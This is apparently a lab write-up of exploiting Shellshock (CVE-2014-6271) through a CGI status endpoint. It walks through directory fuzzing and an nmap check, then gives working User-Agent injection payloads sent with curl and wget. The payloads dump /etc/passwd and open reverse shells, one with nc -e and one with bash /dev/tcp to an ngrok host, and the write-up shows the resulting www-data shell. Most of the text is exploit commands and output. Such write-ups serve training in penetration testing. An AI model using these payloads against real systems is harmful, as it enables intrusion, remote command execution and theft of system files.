exploitation of  CVE-2014-6271.

To exploit "Shellshock", we need to find a way to "talk" to Bash. This implies finding a CGI that will use Bash. CGIs commonly use Python or Perl but it's not uncommon to find (on old servers), CGI written in Shell or even C. 
We can use the nmap script to scan all
https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf?utm_source=dlvr.it&utm_medium=twitter
```
└─# ls /usr/share/nmap/scripts | grep "shellsho"
http-shellshock.nse
```

## Recon
**Fuzz Directory**
First i will search for hidden directory
```
└─# ffuf -u "https://ptl-5275fab7-85a2356f.libcurl.so/FUZZ" -w /usr/share/wordlists/dirb/common.txt
.htpasswd               [Status: 403, Size: 316, Words: 22, Lines: 12, Duration: 592ms]
.htaccess               [Status: 403, Size: 316, Words: 22, Lines: 12, Duration: 680ms]
                        [Status: 200, Size: 1789, Words: 576, Lines: 65, Duration: 843ms]
.hta                    [Status: 403, Size: 311, Words: 22, Lines: 12, Duration: 969ms]
cgi-bin                 [Status: 301, Size: 354, Words: 20, Lines: 10, Duration: 779ms]
cgi-bin/                [Status: 403, Size: 315, Words: 22, Lines: 12, Duration: 638ms]
css                     [Status: 301, Size: 350, Words: 20, Lines: 10, Duration: 1971ms]
favicon.ico             [Status: 200, Size: 14634, Words: 63, Lines: 77, Duration: 2659ms]
index.html              [Status: 200, Size: 1789, Words: 576, Lines: 65, Duration: 500ms]
js                      [Status: 301, Size: 349, Words: 20, Lines: 10, Duration: 2436ms]
server-status           [Status: 403, Size: 320, Words: 22, Lines: 12, Duration: 671ms]
:: Progress: [4614/4614] :: Job [1/1] :: 30 req/sec :: Duration: [0:02:29] :: Errors: 0 ::
```
Humm i got cgi-bin and `301`
I intercept the website on burp and i see that i have 

```
GET /cgi-bin/status 


{ "uptime": " 12:33:32 up 674 days, 4:13, 0 users, load average: 0.11, 0.09, 0.09", "kernel": "Linux 4ab33b1d6921 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux"} 

```
Humm good, it's look like Shellshock.
i will confirm it by using the nmap scaner
```
└─# nmap --script=http-shellshock.nse http://ptl-5275fab7-85a2356f.libcurl.so/
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-18 12:37 GMT

Vulnerable

```
Now to exploit it. we will change the user-agent
```
() { :;}; /bin/bash -c 'nc 192.168.234.166 1337 -e /bin/sh'

() { :;}; /bin/bash -c 'whoami'

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://ptl-5275fab7-85a2356f.libcurl.so/
```
```
└─# wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -c 'echo vulnerable'" http://ptl-31b11da62e1c-2a67a90c9572.libcurl.me/cgi-bin/status
--2023-11-18 13:16:19--  http://ptl-31b11da62e1c-2a67a90c9572.libcurl.me/cgi-bin/status
Resolving ptl-31b11da62e1c-2a67a90c9572.libcurl.me (ptl-31b11da62e1c-2a67a90c9572.libcurl.me)... 163.172.85.157
Connecting to ptl-31b11da62e1c-2a67a90c9572.libcurl.me (ptl-31b11da62e1c-2a67a90c9572.libcurl.me)|163.172.85.157|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11 [text/plain]
Saving to: ‘status’

status                       100%[=============================================>]      11  --.-KB/s    in 0s      

2023-11-18 13:16:21 (673 KB/s) - ‘status’ saved [11/11]

└─# wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -c 'cat /etc/passwd'" http://ptl-31b11da62e1c-2a67a90c9572.libcurl.me/cgi-bin/status
└─# cat status.1 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
                                                                          
```
Now i will replace with my shell
```
└─# wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18079 0>&1'" http://ptl-31b11da62e1c-2a67a90c9572.libcurl.me/cgi-bin/status

──(bloman㉿1337)-[~]
└─$ sudo rlwrap nc -lvnp 1337
[sudo] password for bloman: 
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59188
bash: no job control in this shell
www-data@41f9acb2030c:/var/www/cgi-bin$ 


```